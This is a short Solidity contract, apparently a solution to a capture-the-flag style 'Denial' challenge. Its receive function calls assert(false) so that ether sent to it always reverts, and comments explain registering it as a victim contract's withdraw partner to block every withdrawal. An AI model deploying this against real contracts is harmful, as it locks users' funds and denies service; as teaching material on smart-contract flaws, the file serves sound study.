// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract DenialOfServiceAttack{

    receive() external payable{
        assert(false);


    }

}

// first we use the address of the contract and pass it in the functoin of the Denial contract to make it the withhdraw partner
// Now after that , we set up a recieve function that will automatically get called whem that contract sends this function some ether 
// , once the withdraw functoin is called then  , the recieve function will get kicked in and it will encounter the assert functoin , 
// this will set off our attack add everytime we transact , the assert function will throu off that ttransaction and give us an error. 